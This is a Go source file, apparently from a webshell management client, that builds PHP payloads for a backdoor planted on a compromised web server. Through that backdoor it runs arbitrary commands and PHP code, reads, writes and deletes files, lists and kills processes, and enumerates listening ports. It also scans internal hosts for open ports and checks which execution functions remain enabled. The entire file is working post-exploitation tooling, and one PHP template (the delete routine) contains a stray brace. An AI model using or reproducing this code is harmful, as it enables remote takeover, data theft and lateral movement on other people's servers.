package shell

import (
	"context"
	"fmt"
	"strings"
)

// phpShell 是 PHP 类靶机的公共实现，php-eval 与 php-cmd 共用。
// 两者差别仅在：php-eval 支持提交任意 PHP 代码（文件管理等）且命令回显带标记；
// php-cmd 的靶机一句话只 system($_REQUEST['x'])，无法插入标记，且不支持代码执行。
// 具体差异由字段 eval 控制，避免再写 `if o.Type == TypeCmd` 之类分支。
type phpShell struct {
	eval bool
}

func (p phpShell) Type() string {
	if p.eval {
		return TypeEval
	}
	return TypeCmd
}

// Run 执行系统命令：php-eval 用 passthru 夹标记回显；php-cmd 直接提交命令、无标记。
func (p phpShell) Run(ctx context.Context, o ExecOptions, cmd string) Result {
	cmd = strings.TrimSpace(cmd)
	if p.eval {
		start, end := marker(), marker()
		payload := fmt.Sprintf("echo %s;passthru(%s);echo %s;",
			phpQuote(start), phpQuote(withStderr(cmd)), phpQuote(end))
		return send(ctx, o, payload, start, end)
	}
	// php-cmd：把命令作为值直接提交，回显为响应体原文。
	return send(ctx, o, cmd, "", "")
}

// Code 提交一段（eval 型）PHP 代码到靶机，用于文件管理等结构化能力。
// 代码输出被随机标记包裹，便于从响应中精确截取。php-cmd 不支持，返回错误。
func (p phpShell) Code(ctx context.Context, o ExecOptions, code string) Result {
	if !p.eval {
		return Result{Error: "该操作仅支持 php-eval 类型靶机"}
	}
	start, end := marker(), marker()
	payload := fmt.Sprintf("error_reporting(0);ob_start();%s;echo %s.ob_get_clean().%s;",
		code, phpQuote(start), phpQuote(end))
	return send(ctx, o, payload, start, end)
}

// Probe 返回 Inspect 探测串：PHP 类原样回显探测标记即可（无害裸字符串）。
func (p phpShell) Probe() string { return inspectMark }

// ---------- 结构化能力：返回靶机 PHP 代码（已转义、已替换占位符） ----------

func (p phpShell) FsList(dir string) (string, error) {
	php := fmt.Sprintf(`$dir=%s;$dir=rtrim($dir,'/');if($dir===''){$dir='/';}$abs=is_dir($dir)?(@realpath($dir)?:$dir):$dir;$out=array('ok'=>true,'dir'=>$abs,'entries'=>array());if(!is_dir($abs)){$out['ok']=false;$out['error']='不是目录: '.$dir;}else{foreach(scandir($abs) as $n){if($n==='.'||$n==='..')continue;$p=$abs.'/'.$n;$out['entries'][]=array('name'=>$n,'path'=>$p,'isDir'=>is_dir($p),'size'=>is_file($p)?filesize($p):0,'mode'=>substr(sprintf('%%o',fileperms($p)),-4));}}echo json_encode($out);`, phpQuote(dir))
	return php, nil
}

func (p phpShell) FsRead(path string) (string, error) {
	php := fmt.Sprintf(`$path=%s;if(!is_file($path)){echo json_encode(array('ok'=>false,'error'=>'不是文件: '.$path));}else{echo json_encode(array('ok'=>true,'name'=>basename($path),'size'=>filesize($path),'base64'=>base64_encode(file_get_contents($path))));}`, phpQuote(path))
	return php, nil
}

func (p phpShell) FsWrite(path, b64 string) (string, error) {
	php := fmt.Sprintf(`$path=%s;$data=base64_decode(%s);$b=@file_put_contents($path,$data);echo json_encode($b===false?array('ok'=>false,'error'=>'写入失败'):array('ok'=>true,'bytes'=>$b));`, phpQuote(path), phpQuote(b64))
	return php, nil
}

func (p phpShell) FsDelete(path string) (string, error) {
	php := fmt.Sprintf(`$path=%s;$ok=is_dir($path)?@rmdir($path):@unlink($path);echo json_encode($ok?array('ok'=>true):array('ok'=>false,'error'=>'删除失败'));}`, phpQuote(path))
	return php, nil
}

func (p phpShell) Monitor() (string, error) { return monitorPHP, nil }

func (p phpShell) ProcList() (string, error) { return procPHP, nil }

func (p phpShell) ProcKill(pid string, sig int) (string, error) {
	return fmt.Sprintf(procKillPHP, phpQuote(pid), phpQuote(fmt.Sprintf("%d", sig))), nil
}

func (p phpShell) PortsList() (string, error) { return portsPHP, nil }

func (p phpShell) PortScan(host string, ports string) (string, error) {
	return fmt.Sprintf(portScanPHP, phpQuote(host), phpQuote(ports)), nil
}

func (p phpShell) HostScan(hosts string, ports string, probe string) (string, error) {
	return fmt.Sprintf(portScanHostsPHP, phpQuote(hosts), phpQuote(ports), phpQuote(probe)), nil
}

func (p phpShell) PhpInfo() (string, error) { return phpInfoPHP, nil }

func (p phpShell) AspEnv() (string, error) {
	return "", fmt.Errorf("该操作仅支持 asp / asp-vbs 类型靶机")
}

// ---------- PHP 靶机模板（靶机侧实际执行的 PHP 代码） ----------

// monitorPHP 采集靶机（仅 Linux）的系统资源概览，以 JSON 返回。
// 纯读取 /proc 与 ps，不写入、不执行危险操作；字段缺失时给空值而非报错。
const monitorPHP = `$mem=array();$s=@file_get_contents('/proc/meminfo');if($s){foreach(explode("\n",$s) as $l){if(preg_match('/^(\w+):\s+(\d+)\s*kB/',$l,$x)){$mem[$x[1]]=intval($x[2])*1024;}}}$cores=0;$model='';$c=@file_get_contents('/proc/cpuinfo');if($c){foreach(explode("\n",$c) as $l){if(stripos($l,'processor')===0)$cores++;if($model===''&&stripos($l,'model name')===0){$a=explode(':',$l,2);$model=trim($a[1]);}}}$usage=null;$st=@file_get_contents('/proc/stat');if($st){foreach(explode("\n",$st) as $l){if(strpos($l,'cpu ')===0){$f=preg_split('/\s+/',trim($l));array_shift($f);$sum=0;$idle=0;foreach($f as $i=>$v){$sum+=intval($v);if($i==3||$i==4)$idle+=intval($v);}$usage=$sum>0?(1-$idle/$sum):0;break;}}}$la=array();$u=@file_get_contents('/proc/loadavg');if($u){$p=preg_split('/\s+/',trim($u));$la=array(@$p[0],@$p[1],@$p[2]);}$ds=array();$raw2=@shell_exec('df -P -k 2>&1');if($raw2){$ls2=explode("\n",$raw2);array_shift($ls2);foreach($ls2 as $ln){$ln=trim($ln);if($ln==='')continue;if(preg_match('/^(\S+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)%\s+(.+)$/',$ln,$m)){$ds[]=array('fs'=>$m[1],'total'=>intval($m[2])*1024,'used'=>intval($m[3])*1024,'avail'=>intval($m[4])*1024,'use'=>intval($m[5]),'mount'=>trim($m[6]));}}}$ps=array();$raw=@shell_exec('ps -eo pid,user,pcpu,pmem,comm 2>&1');if($raw){$ls=explode("\n",trim($raw));array_shift($ls);foreach($ls as $ln){$ln=trim($ln);if($ln==='')continue;$f=preg_split('/\s+/',$ln);if(count($f)>=5){$ps[]=array('pid'=>$f[0],'user'=>$f[1],'cpu'=>floatval($f[2]),'mem'=>floatval($f[3]),'cmd'=>$f[4]);}}}$ips=array();$ft=@file_get_contents('/proc/net/fib_trie');if($ft){foreach(explode("\n",$ft) as $ln){if(preg_match('/\S+\s+([0-9.]+)\/32 host/',$ln,$m)){$ip=$m[1];if(strpos($ip,'127.')!==0&&strpos($ip,'169.254.')!==0)$ips[]=$ip;}}}$ips=array_values(array_unique($ips));if(empty($ips)){$g=@gethostbyname(@gethostname());if($g)$ips[]=$g;}$pub='';foreach(array('https://cip.cc','https://icanhazip.com','https://ipconfig.io') as $u){$ctx=@stream_context_create(array('http'=>array('timeout'=>4,'ignore_errors'=>true)));$r=@file_get_contents($u,false,$ctx);if($r===false)continue;$r=trim($r);if(preg_match('/^IP\s*:\s*([0-9a-fA-F\.:]+)/m',$r,$m)){$pub=trim($m[1]);break;}if(filter_var($r,FILTER_VALIDATE_IP)){$pub=$r;break;}}$out=array('ok'=>true,'hostname'=>@gethostname(),'os'=>@php_uname(),'uptime'=>@file_get_contents('/proc/uptime'),'loadavg'=>$la,'mem'=>$mem,'cpu'=>array('cores'=>$cores,'model'=>$model,'usage'=>$usage),'disks'=>$ds,'procs'=>$ps,'intIPs'=>$ips,'pubIP'=>$pub);echo json_encode($out);`

// procPHP 采集靶机进程列表（含父进程 PID 与完整命令行），用于进程树展示。
// 纯读取 ps 输出，不写入、不执行危险操作；ps 不可用时给空列表而非报错。
const procPHP = `$ps=array();$raw=@shell_exec('ps -eo pid,ppid,user,pcpu,pmem,args 2>&1');if($raw){$ls=explode("\n",rtrim($raw));array_shift($ls);foreach($ls as $ln){$ln=rtrim($ln);if($ln==='')continue;if(preg_match('/^\s*(\d+)\s+(\d+)\s+(\S+)\s+([\d.]+)\s+([\d.]+)\s+(.*)$/',$ln,$m)){$ps[]=array('pid'=>$m[1],'ppid'=>$m[2],'user'=>$m[3],'cpu'=>floatval($m[4]),'mem'=>floatval($m[5]),'cmd'=>$m[6]);}}}echo json_encode(array('ok'=>true,'procs'=>$ps));`

// procKillPHP 向靶机指定 PID 发送信号以结束进程。优先 posix_kill，回退到 kill 命令。
const procKillPHP = `$pid=intval(%s);$sig=intval(%s);if($pid<=0){echo json_encode(array('ok'=>false,'error'=>'无效 PID'));return;}$ok=false;$err='';if(function_exists('posix_kill')){$ok=@posix_kill($pid,$sig);if(!$ok)$err='posix_kill 失败（可能无权限）';}elseif(function_exists('shell_exec')){$out=@shell_exec('kill -'.$sig.' '.$pid.' 2>&1');$ok=($out===null||trim($out)==='');if(!$ok)$err=trim($out)!==''?trim($out):'kill 执行失败';}else{$err='环境不支持 posix_kill 或 shell_exec';}echo json_encode(array('ok'=>$ok,'error'=>$err));`

// portsPHP 解析 /proc/net/tcp(6) 里的 LISTEN 套接字（状态 0A），并把 socket inode
// 通过 /proc/*/fd 软链映射到所属进程。纯读取内核结构，不依赖 ss / netstat，
// 字段缺失时给空值而非报错。16 进制地址按小端字节序还原为可读 IP。
const portsPHP = `foreach (array('/proc/net/tcp', '/proc/net/tcp6') as $f) {
  $s = @file_get_contents($f);
  if ($s === false) continue;
  $v6 = basename($f) === 'tcp6';
  foreach (explode("\n", $s) as $ln) {
    $ln = trim($ln);
    if ($ln === '') continue;
    $c = preg_split('/\s+/', $ln);
    if (count($c) < 10) continue;
    if ($c[3] !== '0A') continue;
    $lp = explode(':', $c[1], 2);
    $ports[] = array('proto' => $v6 ? 'tcp6' : 'tcp', 'addr' => hxaddr($lp[0], $v6), 'port' => hexdec($lp[1]), 'inode' => $c[9], 'pid' => '', 'comm' => '');
  }
}
foreach ($ports as &$p) {
  if ($p['inode'] !== '' && $p['inode'] !== '0') { list($p['pid'], $p['comm']) = inodetoproc($p['inode']); }
}
unset($p);
echo json_encode(array('ok' => true, 'ports' => $ports));
function hxaddr($h, $v6) {
  $h = str_pad($h, $v6 ? 32 : 8, '0', STR_PAD_LEFT);
  $raw = strrev(hex2bin($h));
  $r = @inet_ntop($raw);
  return $r !== false ? $r : $h;
}
function inodetoproc($inode) {
  $pid = ''; $comm = '';
  $dh = @opendir('/proc');
  if ($dh === false) return array($pid, $comm);
  while (($pd = readdir($dh)) !== false) {
    if (!ctype_digit($pd)) continue;
    $fdh = @opendir('/proc/' . $pd . '/fd');
    if ($fdh === false) continue;
    while (($fd = readdir($fdh)) !== false) {
      $link = @readlink('/proc/' . $pd . '/fd/' . $fd);
      if ($link === 'socket:[' . $inode . ']') {
        $cm = @file_get_contents('/proc/' . $pd . '/comm');
        $pid = $pd; $comm = $cm !== false ? trim($cm) : '';
        closedir($fdh); closedir($dh);
        return array($pid, $comm);
      }
    }
    closedir($fdh);
  }
  closedir($dh);
  return array($pid, $comm);
}`

// portScanPHP 对目标主机做 TCP 端口探测：用 fsockopen 对每个端口尝试连接，
// 连接成功（得到资源句柄）即视为开放。超时 2 秒，避免单个过滤端口拖垮整体。
const portScanPHP = `$host = %s;
$ports = explode(',', %s);
$results = array();
$st = microtime(true);
foreach ($ports as $p) {
  $p = trim($p);
  if ($p === '') continue;
  $errno = 0; $errstr = '';
  $fp = @fsockopen($host, (int)$p, $errno, $errstr, 2);
  if (!is_resource($fp)) { $fp = @stream_socket_client("tcp://" . $host . ":" . (int)$p, $errno, $errstr, 2); }
  $open = is_resource($fp);
  if ($open) fclose($fp);
  $results[] = array('port' => (int)$p, 'open' => $open);
}
echo json_encode(array('ok' => true, 'host' => $host, 'ports' => $results, 'elapsed' => microtime(true) - $st));`

// portScanHostsPHP 对内网多台主机做 TCP 端口探测：先用一组常见端口短超时做存活探测，
// 在线主机再扫描完整端口列表。fsockopen 连接成功（得到资源句柄）即视为开放。
const portScanHostsPHP = `function _wsh_try($host, $port, $to) {
  $errno = 0; $errstr = '';
  $fp = @fsockopen($host, (int)$port, $errno, $errstr, $to);
  if (!is_resource($fp)) { $fp = @stream_socket_client("tcp://" . $host . ":" . (int)$port, $errno, $errstr, $to); }
  $open = is_resource($fp);
  if ($open) fclose($fp);
  return $open;
}
$hosts = explode('|', %s);
$ports = explode(',', %s);
$probe = explode(',', %s);
$results = array();
$st = microtime(true);
foreach ($hosts as $h) {
  $h = trim($h);
  if ($h === '') continue;
  $up = false;
  foreach ($probe as $pr) {
    $pr = trim($pr);
    if ($pr === '') continue;
    if (_wsh_try($h, $pr, 0.4)) { $up = true; break; }
  }
  $opj = array();
  if ($up) {
    foreach ($ports as $p) {
      $p = trim($p);
      if ($p === '') continue;
      if (_wsh_try($h, $p, 0.8)) $opj[] = (int)$p;
    }
  }
  $results[] = array('host' => $h, 'alive' => $up, 'ports' => $opj);
}
echo json_encode(array('ok' => true, 'hosts' => $results, 'elapsed' => microtime(true) - $st));`

// phpInfoPHP 收集 phpinfo 中与「能力短板」相关的关键项：版本 / SAPI / 被禁用的函数、
// open_basedir / allow_url_include 等受限配置，并直接判定命令执行函数是否可用。
// 以 JSON 返回，前端据此给出「还能执行命令吗 / 文件访问受限吗」的研判。
const phpInfoPHP = `$df = preg_split('/[,\s]+/', strtolower(trim(ini_get('disable_functions'))), -1, PREG_SPLIT_NO_EMPTY);
$execFns = array('exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open', 'pcntl_exec');
$execAvailable = array();
foreach ($execFns as $fn) { $execAvailable[$fn] = function_exists($fn) && !in_array($fn, $df, true); }
$anyExec = in_array(true, array_values($execAvailable), true);
$out = array(
  'ok' => true,
  'version' => PHP_VERSION,
  'sapi' => php_sapi_name(),
  'os' => PHP_OS,
  'disabledFunctions' => $df,
  'disableClasses' => trim(ini_get('disable_classes')),
  'openBasedir' => trim(ini_get('open_basedir')),
  'safeMode' => trim(ini_get('safe_mode')),
  'allowUrlFopen' => trim(ini_get('allow_url_fopen')),
  'allowUrlInclude' => trim(ini_get('allow_url_include')),
  'displayErrors' => trim(ini_get('display_errors')),
  'fileUploads' => trim(ini_get('file_uploads')),
  'uploadTmpDir' => trim(ini_get('upload_tmp_dir')),
  'docRoot' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
  'serverSoftware' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '',
  'user' => function_exists('get_current_user') ? get_current_user() : '',
  'extensions' => get_loaded_extensions(),
  'execFunctions' => $execAvailable,
  'anyExec' => $anyExec,
);
echo json_encode($out);`
